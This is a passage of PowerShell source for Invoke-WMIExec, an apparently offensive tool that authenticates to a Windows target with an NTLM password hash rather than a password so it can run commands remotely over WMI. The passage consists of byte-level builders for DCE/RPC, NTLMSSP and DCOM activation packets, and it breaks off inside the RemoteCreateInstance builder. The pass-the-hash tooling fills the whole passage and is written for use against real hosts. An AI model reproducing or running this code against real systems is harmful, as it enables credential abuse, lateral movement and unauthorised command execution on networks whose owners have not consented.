function Invoke-WMIExec
{
[CmdletBinding()]
param
(
    [parameter(Mandatory=$true)][String]$Target,
    [parameter(Mandatory=$true)][String]$Username,
    [parameter(Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][String]$Command,
    [parameter(Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][Int]$Sleep=10
)

if($Command)
{
    $WMI_execute = $true
}

function ConvertFrom-PacketOrderedDictionary
{
    param($packet_ordered_dictionary)

    ForEach($field in $packet_ordered_dictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}


function Get-PacketRPCBind()
{
    param([Int]$packet_call_ID,[Byte[]]$packet_max_frag,[Byte[]]$packet_num_ctx_items,[Byte[]]$packet_context_ID,[Byte[]]$packet_UUID,[Byte[]]$packet_UUID_version)

    [Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)

    $packet_RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCBind.Add("RPCBind_Version",[Byte[]](0x05))
    $packet_RPCBind.Add("RPCBind_VersionMinor",[Byte[]](0x00))
    $packet_RPCBind.Add("RPCBind_PacketType",[Byte[]](0x0b))
    $packet_RPCBind.Add("RPCBind_PacketFlags",[Byte[]](0x03))
    $packet_RPCBind.Add("RPCBind_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCBind.Add("RPCBind_FragLength",[Byte[]](0x48,0x00))
    $packet_RPCBind.Add("RPCBind_AuthLength",[Byte[]](0x00,0x00))
    $packet_RPCBind.Add("RPCBind_CallID",$packet_call_ID_bytes)
    $packet_RPCBind.Add("RPCBind_MaxXmitFrag",[Byte[]](0xb8,0x10))
    $packet_RPCBind.Add("RPCBind_MaxRecvFrag",[Byte[]](0xb8,0x10))
    $packet_RPCBind.Add("RPCBind_AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_RPCBind.Add("RPCBind_NumCtxItems",$packet_num_ctx_items)
    $packet_RPCBind.Add("RPCBind_Unknown",[Byte[]](0x00,0x00,0x00))
    $packet_RPCBind.Add("RPCBind_ContextID",$packet_context_ID)
    $packet_RPCBind.Add("RPCBind_NumTransItems",[Byte[]](0x01))
    $packet_RPCBind.Add("RPCBind_Unknown2",[Byte[]](0x00))
    $packet_RPCBind.Add("RPCBind_Interface",$packet_UUID)
    $packet_RPCBind.Add("RPCBind_InterfaceVer",$packet_UUID_version)
    $packet_RPCBind.Add("RPCBind_InterfaceVerMinor",[Byte[]](0x00,0x00))
    $packet_RPCBind.Add("RPCBind_TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    $packet_RPCBind.Add("RPCBind_TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

    if($packet_num_ctx_items[0] -eq 2)
    {
        $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))
        $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))
        $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
        $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
    }
    elseif($packet_num_ctx_items[0] -eq 3)
    {
        $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))
        $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))
        $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
        $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
        $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x02,0x00))
        $packet_RPCBind.Add("RPCBind_NumTransItems3",[Byte[]](0x01))
        $packet_RPCBind.Add("RPCBind_Unknown4",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_Interface3",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
        $packet_RPCBind.Add("RPCBind_InterfaceVer3",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_InterfaceVerMinor3",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))
        $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x04))
        $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_ContextID4",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
        $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    if($packet_call_ID -eq 3)
    {
        $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))
        $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x02))
        $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
        $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    return $packet_RPCBind
}

function Get-PacketRPCAUTH3()
{
    param([Byte[]]$packet_NTLMSSP)

    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLMSSP.Length)
    $packet_NTLMSSP_length = $packet_NTLMSSP_length[0,1]
    [Byte[]]$packet_RPC_length = [System.BitConverter]::GetBytes($packet_NTLMSSP.Length + 28)
    $packet_RPC_length = $packet_RPC_length[0,1]

    $packet_RPCAuth3 = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCAuth3.Add("RPCAUTH3_Version",[Byte[]](0x05))
    $packet_RPCAuth3.Add("RPCAUTH3_VersionMinor",[Byte[]](0x00))
    $packet_RPCAuth3.Add("RPCAUTH3_PacketType",[Byte[]](0x10))
    $packet_RPCAuth3.Add("RPCAUTH3_PacketFlags",[Byte[]](0x03))
    $packet_RPCAuth3.Add("RPCAUTH3_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCAuth3.Add("RPCAUTH3_FragLength",$packet_RPC_length)
    $packet_RPCAuth3.Add("RPCAUTH3_AuthLength",$packet_NTLMSSP_length)
    $packet_RPCAuth3.Add("RPCAUTH3_CallID",[Byte[]](0x03,0x00,0x00,0x00))
    $packet_RPCAuth3.Add("RPCAUTH3_MaxXmitFrag",[Byte[]](0xd0,0x16))
    $packet_RPCAuth3.Add("RPCAUTH3_MaxRecvFrag",[Byte[]](0xd0,0x16))
    $packet_RPCAuth3.Add("RPCAUTH3_AuthType",[Byte[]](0x0a))
    $packet_RPCAuth3.Add("RPCAUTH3_AuthLevel",[Byte[]](0x02))
    $packet_RPCAuth3.Add("RPCAUTH3_AuthPadLength",[Byte[]](0x00))
    $packet_RPCAuth3.Add("RPCAUTH3_AuthReserved",[Byte[]](0x00))
    $packet_RPCAuth3.Add("RPCAUTH3_ContextID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_RPCAuth3.Add("RPCAUTH3_NTLMSSP",$packet_NTLMSSP)

    return $packet_RPCAuth3
}

function Get-PacketRPCRequest()
{
    param([Byte[]]$packet_flags,[Int]$packet_service_length,[Int]$packet_auth_length,[Int]$packet_auth_padding,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_opnum,[Byte[]]$packet_data)

    if($packet_auth_length -gt 0)
    {
        $packet_full_auth_length = $packet_auth_length + $packet_auth_padding + 8
    }

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24 + $packet_full_auth_length + $packet_data.Length)
    [Byte[]]$packet_frag_length = $packet_write_length[0,1]
    [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length + $packet_data.Length)
    [Byte[]]$packet_auth_length = [System.BitConverter]::GetBytes($packet_auth_length)
    $packet_auth_length = $packet_auth_length[0,1]

    $packet_RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCRequest.Add("RPCRequest_Version",[Byte[]](0x05))
    $packet_RPCRequest.Add("RPCRequest_VersionMinor",[Byte[]](0x00))
    $packet_RPCRequest.Add("RPCRequest_PacketType",[Byte[]](0x00))
    $packet_RPCRequest.Add("RPCRequest_PacketFlags",$packet_flags)
    $packet_RPCRequest.Add("RPCRequest_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCRequest.Add("RPCRequest_FragLength",$packet_frag_length)
    $packet_RPCRequest.Add("RPCRequest_AuthLength",$packet_auth_length)
    $packet_RPCRequest.Add("RPCRequest_CallID",$packet_call_ID)
    $packet_RPCRequest.Add("RPCRequest_AllocHint",$packet_alloc_hint)
    $packet_RPCRequest.Add("RPCRequest_ContextID",$packet_context_ID)
    $packet_RPCRequest.Add("RPCRequest_Opnum",$packet_opnum)

    if($packet_data.Length)
    {
        $packet_RPCRequest.Add("RPCRequest_Data",$packet_data)
    }

    return $packet_RPCRequest
}

function Get-PacketRPCAlterContext()
{
    param([Byte[]]$packet_assoc_group,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_interface_UUID)

    $packet_RPCAlterContext = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCAlterContext.Add("RPCAlterContext_Version",[Byte[]](0x05))
    $packet_RPCAlterContext.Add("RPCAlterContext_VersionMinor",[Byte[]](0x00))
    $packet_RPCAlterContext.Add("RPCAlterContext_PacketType",[Byte[]](0x0e))
    $packet_RPCAlterContext.Add("RPCAlterContext_PacketFlags",[Byte[]](0x03))
    $packet_RPCAlterContext.Add("RPCAlterContext_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCAlterContext.Add("RPCAlterContext_FragLength",[Byte[]](0x48,0x00))
    $packet_RPCAlterContext.Add("RPCAlterContext_AuthLength",[Byte[]](0x00,0x00))
    $packet_RPCAlterContext.Add("RPCAlterContext_CallID",$packet_call_ID)
    $packet_RPCAlterContext.Add("RPCAlterContext_MaxXmitFrag",[Byte[]](0xd0,0x16))
    $packet_RPCAlterContext.Add("RPCAlterContext_MaxRecvFrag",[Byte[]](0xd0,0x16))
    $packet_RPCAlterContext.Add("RPCAlterContext_AssocGroup",$packet_assoc_group)
    $packet_RPCAlterContext.Add("RPCAlterContext_NumCtxItems",[Byte[]](0x01))
    $packet_RPCAlterContext.Add("RPCAlterContext_Unknown",[Byte[]](0x00,0x00,0x00))
    $packet_RPCAlterContext.Add("RPCAlterContext_ContextID",$packet_context_ID)
    $packet_RPCAlterContext.Add("RPCAlterContext_NumTransItems",[Byte[]](0x01))
    $packet_RPCAlterContext.Add("RPCAlterContext_Unknown2",[Byte[]](0x00))
    $packet_RPCAlterContext.Add("RPCAlterContext_Interface",$packet_interface_UUID)
    $packet_RPCAlterContext.Add("RPCAlterContext_InterfaceVer",[Byte[]](0x00,0x00))
    $packet_RPCAlterContext.Add("RPCAlterContext_InterfaceVerMinor",[Byte[]](0x00,0x00))
    $packet_RPCAlterContext.Add("RPCAlterContext_TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    $packet_RPCAlterContext.Add("RPCAlterContext_TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

    return $packet_RPCAlterContext
}

function Get-PacketNTLMSSPVerifier()
{
    param([Int]$packet_auth_padding,[Byte[]]$packet_auth_level,[Byte[]]$packet_sequence_number)

    $packet_NTLMSSPVerifier = New-Object System.Collections.Specialized.OrderedDictionary

    if($packet_auth_padding -eq 4)
    {
        $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadding",[Byte[]](0x00,0x00,0x00,0x00))
        [Byte[]]$packet_auth_pad_length = 0x04
    }
    elseif($packet_auth_padding -eq 8)
    {
        $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadding",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        [Byte[]]$packet_auth_pad_length = 0x08
    }
    elseif($packet_auth_padding -eq 12)
    {
        $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadding",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        [Byte[]]$packet_auth_pad_length = 0x0c
    }
    else
    {
        [Byte[]]$packet_auth_pad_length = 0x00
    }

    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthType",[Byte[]](0x0a))
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthLevel",$packet_auth_level)
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadLen",$packet_auth_pad_length)
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthReserved",[Byte[]](0x00))
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthContextID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_NTLMSSPVerifierVersionNumber",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_NTLMSSPVerifierChecksum",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_NTLMSSPVerifierSequenceNumber",$packet_sequence_number)

    return $packet_NTLMSSPVerifier
}

function Get-PacketDCOMRemQueryInterface()
{
    param([Byte[]]$packet_causality_ID,[Byte[]]$packet_IPID,[Byte[]]$packet_IID)

    $packet_DCOMRemQueryInterface = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_VersionMajor",[Byte[]](0x05,0x00))
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_VersionMinor",[Byte[]](0x07,0x00))
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_CausalityID",$packet_causality_ID)
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_IPID",$packet_IPID)
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Refs",[Byte[]](0x05,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_IIDs",[Byte[]](0x01,0x00))
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Unknown",[Byte[]](0x00,0x00,0x01,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_IID",$packet_IID)

    return $packet_DCOMRemQueryInterface
}

function Get-PacketDCOMRemRelease()
{
    param([Byte[]]$packet_causality_ID,[Byte[]]$packet_IPID,[Byte[]]$packet_IPID2)

    $packet_DCOMRemRelease = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_DCOMRemRelease.Add("DCOMRemRelease_VersionMajor",[Byte[]](0x05,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_VersionMinor",[Byte[]](0x07,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_CausalityID",$packet_causality_ID)
    $packet_DCOMRemRelease.Add("DCOMRemRelease_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_Unknown",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_InterfaceRefs",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_IPID",$packet_IPID)
    $packet_DCOMRemRelease.Add("DCOMRemRelease_PublicRefs",[Byte[]](0x05,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_PrivateRefs",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_IPID2",$packet_IPID2)
    $packet_DCOMRemRelease.Add("DCOMRemRelease_PublicRefs2",[Byte[]](0x05,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("DCOMRemRelease_PrivateRefs2",[Byte[]](0x00,0x00,0x00,0x00))

    return $packet_DCOMRemRelease
}

function Get-PacketDCOMRemoteCreateInstance()
{
    param([Byte[]]$packet_causality_ID,[String]$packet_target)

    [Byte[]]$packet_target_unicode = [System.Text.Encoding]::Unicode.GetBytes($packet_target)
    [Byte[]]$packet_target_length = [System.BitConverter]::GetBytes($packet_target.Length + 1)
    $packet_target_unicode += ,0x00 * (([Math]::Truncate($packet_target_unicode.Length / 8 + 1) * 8) - $packet_target_unicode.Length)
    [Byte[]]$packet_cntdata = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 720)
    [Byte[]]$packet_size = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 680)
    [Byte[]]$packet_total_size = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 664)
    [Byte[]]$packet_private_header = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 40) + 0x00,0x00,0x00,0x00
    [Byte[]]$packet_property_data_size = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 56)

    $packet_DCOMRemoteCreateInstance = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMVersionMajor",[Byte[]](0x05,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMVersionMinor",[Byte[]](0x07,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMFlags",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMCausalityID",$packet_causality_ID)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown3",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown4",$packet_cntdata)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCntData",$packet_cntdata)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesOBJREFSignature",[Byte[]](0x4d,0x45,0x4f,0x57))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesOBJREFFlags",[Byte[]](0x04,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesOBJREFIID",[Byte[]](0xa2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFCLSID",[Byte[]](0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFCBExtension",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFSize",$packet_size)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesTotalSize",$packet_total_size)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderPrivateHeader",[Byte[]](0xb0,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderTotalSize",$packet_total_size)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCustomHeaderSize",[Byte[]](0xc0,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesDestinationContext",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesNumActivationPropertyStructs",[Byte[]](0x06,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsInfoClsid",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesNULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrMaxCount",[Byte[]](0x06,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid",[Byte[]](0xb9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid2",[Byte[]](0xab,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid3",[Byte[]](0xa5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid4",[Byte[]](0xa6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid5",[Byte[]](0xa4,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid6",[Byte[]](0xaa,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrMaxCount",[Byte[]](0x06,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize",[Byte[]](0x68,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize2",[Byte[]](0x58,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize3",[Byte[]](0x90,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize4",$packet_property_data_size)
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize5",[Byte[]](0x20,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize6",[Byte[]](0x30,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
